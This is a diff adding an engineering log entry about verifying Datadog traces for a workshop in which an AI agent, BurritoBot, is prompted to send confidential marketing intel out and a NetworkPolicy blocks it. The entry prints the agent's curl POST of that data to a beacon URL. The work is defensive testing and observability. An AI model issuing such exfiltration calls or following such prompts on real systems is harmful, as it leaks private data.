@@ -16586,3 +16586,78 @@ change itself needs nothing synced: it is a test, and it was run here on both cl
 
 **The suites (run 17269, at `c324d4a2`).** `bash verify/run-e2e-tools.sh` ran 55 checks (the offline suite and 54 tier
 tests) in 27m42s and printed `ALL E2E TOOLS TIER CHECKS GREEN`, exit 0.
+
+## 2026-11-05 · #265 · The before/after trace on watch-it-burn-private: one root, the prompt and reply on it, one red tool span for a block
+
+**What was owed.** Every #265 entry since 2026-10-30 left the same live look: send Challenge 1's prompt with the C1
+NetworkPolicies on, open the interaction in Datadog, and check that the trace list reads 1 error with
+`execute_tool (merged)` not red. Runs 16483 and 16691 could not read their cluster session (hecaton#508). Run 17275
+could, and ran it on watch-it-burn-private (Datadog names it `burritobot-private`), where Argo CD reports every
+application Synced and Healthy at this run's base `af0b563a`. The live collector ConfigMap
+`monitoring/otel-collector-opentelemetry-collector-agent` names `execute_tool (merged)` 6 times (the six status
+statements; values.yaml's seventh is a comment) and `mark_tool_failure` 0 times.
+
+**Before** (the coordinator's check of 2026-10-31 at staging `0934f27`, APM trace `1ca10bfa07e8160499a3773e102bb380`,
+posted on #265): Agent Observability's trace list read 2 errors, `execute_tool run_shell` and its parent
+`execute_tool (merged)`; the trace showed two root-level rows, guard-proxy's `POST` as an llm row and a `POST` workflow
+row holding `invocation`; and the root row read "No content" for input and output.
+
+**After** (2026-11-05, read through the LLM Observability and APM spans APIs with the `watch-it-burn/datadog` read
+keys, `python3 verify/dd_traces.py --profile accen-dev --trace <id> --json`):
+
+    bash verify/c1-exfil-block.sh burritobot-private watch-it-burn-private accen-dev
+      OK    burritobot-private: with the C1 policies on, BurritoBot reports the send as failed      (sent 03:22:49Z)
+
+    trace 9d3a070b748c5b108e26a04a0814376a  2026-11-05T03:23:04Z  8 spans  1 root(s)  env=burritobot-kubecon-na-26
+      agent POST  22986 ms  ok
+        agent invocation  22611 ms  ok
+          agent workshop_agent  22595 ms  ok
+            llm generate_content arn:...:application-inference-profile/88hce5o0zw45  1367 ms  ok  5400 tokens
+            tool (merged tools)  20012 ms  ok
+              tool run_shell  20012 ms  error
+              tool get_marketing_intel  12 ms  ok
+            llm generate_content arn:...:application-inference-profile/88hce5o0zw45  1188 ms  ok  6049 tokens
+
+Read against Michael's 2026-09-06 list:
+- *Her prompt, and the reply:* the root row's input is the prompt and its output is BurritoBot's reply ("The attempt
+  to resend the marketing intel failed due to a network issue..."). One root row, kind agent, session
+  `01a1a9bb-421f-7a0e-856e-031912dab91a`. The "No content" root and the second root row are gone (#746's copy).
+- *What the agent decided:* the first `generate_content` row's output holds its reasoning and both tool calls.
+- *Every tool call with its arguments and result:* `run_shell` input `{"command":"curl -X POST -d @- <the beacon URL>"}`,
+  output `command FAILED: it did not complete within 20s. The connection it was waiting on is blocked or hanging, most
+  likely by a NetworkPolicy. Nothing was sent.`; `get_marketing_intel` input `{}`, output the confidential payload.
+- *Whether anything was blocked:* one error span in the trace, `run_shell`. `(merged tools)` is ok, and both
+  `generate_content` rows are ok. In APM (trace `9d352dffa84e5674a6af3f4b10662808`, 110 spans, one root, guard-proxy's `POST`, and `execute_tool run_shell` its
+  only error span), the
+  same `execute_tool run_shell` carries `error.type` `tool_error` and the message "the tool call failed (see
+  gen_ai.tool.call.result)", and `execute_tool (merged)` is ok.
+- *The model calls with their tokens:* 5303 in and 97 out, then 5947 in and 102 out, each split by role.
+- *And their cost:* missing. Both llm rows carry `cost_estimate_status:skipped_unsupported_model_pricing`. The model
+  name Datadog gets is the cluster's application inference profile ARN (#513's per-cluster cost tag), which it has no
+  price for. `aws bedrock get-inference-profile` names the profile `watch-it-burn-private-nova`, a copy of
+  `amazon.nova-pro-v1:0`. The same ARN is also the row's name. That change is proposed as its own issue (follow-up).
+
+An earlier send at 03:12:03Z (trace `dd19f861b1e1587b995dae9e308b4415`) has the same shape, but its `run_shell` failed in
+35 ms on a malformed curl (`-d '@(get_marketing_intel)'`, exit 26), so the reply's "error" passed the script without a
+NetworkPolicy block. The 03:22:49Z send is the one that hit the policy. `CONTEXT=watch-it-burn-private python3
+verify/one_root_probe.py` passed all 12 checks on trace `37aced6cec344818a76c6ddfb038163a`: `One interaction, one root.`
+
+**Two smaller things seen.** In Agent Observability the `run_shell` row's error reads type `*errors.errorString` with
+the full failure text as its message, from ADK's own exception event; the APM copy reads `tool_error` as the collector
+sets it. In APM, every MCP tool call adds two parentless 2-span traces from `burritobot-gateway` (`POST` on port 3001,
+then `tools/call workshop-mcp_<tool>`), four around this one interaction, and the 20 seconds of the blocked call add
+about 20 one-a-second `POST` subtrees under guard-proxy's root. Agent Observability shows neither. Both are proposed as
+a follow-up.
+
+**The check deleted Argo CD's policies.** `verify/c1-exfil-block.sh` deleted all six C1 policies on exit. On
+watch-it-burn-private those six names are Argo CD's (`policies/network-policies`, the armed admin cluster), so the
+03:12 run left the agent's egress open from 03:12:22Z until Argo CD's next reconcile recreated them at 03:17:06Z. The
+script now reads the six before it applies them, puts back on exit the ones that were there as they were (`kubectl
+replace`, server metadata stripped), and deletes only the ones it created. `verify/test_c1_exfil_block_restore.py`
+(offline) runs the script against a fake kubectl that keeps state, for an attendee cluster (none there), an armed
+cluster (all six there) and a half-armed one, and with a reply that reports no failure. It fails 4 checks against the
+old script. On the cluster, the 03:22:49Z run left all six with the uids they had before, and `network-policies` read
+Synced at 03:25:57Z.
+
+**What is left of #265.** The spike write-up's update is general-knowledge#120. The cost row and the APM noise are
+proposed as their own issues, as #265 asks for the change that comes out of the spike.
